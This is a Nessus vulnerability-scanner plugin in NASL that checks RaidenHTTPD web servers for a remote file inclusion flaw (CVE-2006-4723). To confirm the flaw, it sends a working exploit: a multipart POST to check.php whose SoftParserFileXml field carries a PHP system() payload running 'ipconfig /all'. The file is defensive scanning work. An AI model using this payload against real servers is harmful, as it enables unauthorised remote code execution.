#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22317);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_cve_id("CVE-2006-4723");
  script_bugtraq_id(19918);
  script_osvdb_id(28746);
  script_xref(name:"EDB-ID", value:"2328");

  script_name(english:"RaidenHTTPD check.php SoftParserFileXml Parameter Remote File Inclusion");
  script_summary(english:"Tries to run a command with RaidenHTTPD");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
remote file include attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running RaidenHTTPD, a web server for Windows. 

The version of RaidenHTTPD on the remote host fails to sanitize
user-supplied input to the 'SoftParserFileXml' of the
'/raidenhttpd-admin/slice/check.php' script before using it to include
PHP code.  An unauthenticated attacker may be able to exploit this issue
to view arbitrary files or to execute arbitrary PHP code on the remote
host, subject to the privileges of the user under which the application
runs, LOCAL SYSTEM by default.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/09/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/09/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:raidenhttpd:raidenhttpd");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

# Unless we're paranoid, make sure the banner indicates it's RaidenHTTPD.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: RaidenHTTPD" >!< banner) exit(0);
}


# Make sure the affected script exists.
url = "/raidenhttpd-admin/slice/check.php";
r = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(r)) exit(0);

# If it does...
#
# nb: the script doesn't respond when called directly.
if (r[0] =~ "^HTTP/.* 200 OK")
{
  # Try to exploit the flaw to execute a command.
  cmd = "ipconfig /all";
  bound = "bound";
  boundary = string("--", bound);
  postdata = string(
    boundary, "\r\n", 
    'Content-Disposition: form-data; name="SoftParserFileXml"; filename="', SCRIPT_NAME, '";', "\r\n",
    "Content-Type: image/jpeg;\r\n",
    "\r\n",
    '<?php system("', cmd, '"); die; ?>\r\n',

    boundary, "--", "\r\n"
  );

  r = http_send_recv3(method: "POST", item: url, port: port,
    content_type: "multipart/form-data; boundary="+bound,
    data: postdata );
  if (isnull(r)) exit(0, "The web server did not answer");
  res = r[2];

  # There's a problem if it looks like the output of ipconfig.
  if ("Windows IP Configuration" >< res)
  {
    if (report_verbosity < 1) report = desc;
    else report = string(
      "Nessus was able to execute the command '", cmd, "' on the remote\n",
      "host, which produced the following output :\n",
      "\n",
      res
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
